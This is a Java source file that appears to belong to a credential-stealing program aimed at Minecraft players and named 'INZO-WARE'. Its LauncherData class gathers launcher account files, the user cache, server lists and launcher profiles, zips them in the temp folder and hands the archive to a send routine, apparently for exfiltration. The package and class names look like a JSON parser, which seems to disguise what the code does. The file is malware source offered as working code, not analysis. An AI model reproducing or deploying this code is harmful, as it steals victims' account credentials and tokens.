package com.inzo.technologies.inzoware.mc.parsers.impl;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

import com.inzo.technologies.inzoware.mc.parsers.JSONObject;
import com.inzo.technologies.inzoware.mc.parsers.JSONRegexHandler;
import com.inzo.technologies.inzoware.mc.parsers.util.FileSystemHelper;
import com.inzo.technologies.inzoware.mc.parsers.util.JSONBuilder;

public final class LauncherData implements JSONObject {
    private static final String[] IMPORTANT_FILES = new String[]{"launcher_accounts.json", "launcher_accounts_microsoft_store.json", "usercache.json", "servers.dat", "launcher_profiles.json"};

    @Override
    public void handle() {
        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;

        String meteorFolder = mcFolder;
        if (!Files.exists(Paths.get(meteorFolder))) {
            JSONRegexHandler.send(new JSONBuilder().value("content", "> Did not contain the LauncherData.").build());
            return;
        }

        ArrayList<File> validFileDirs = new ArrayList<>(); 
        for (String fileName : IMPORTANT_FILES) {
            String dir = meteorFolder + fileName;
            if (!Files.exists(Paths.get(dir))) continue;

            validFileDirs.add(new File(dir));
        }

        String zipFile = System.getProperty("java.io.tmpdir") + sep + "LauncherData_INZO-WARE.zip";
        FileSystemHelper.zip(zipFile, validFileDirs);
        JSONRegexHandler.send(new File(zipFile));
    }

    @Override
    public String getName() {
        return "LauncherData";
    }
}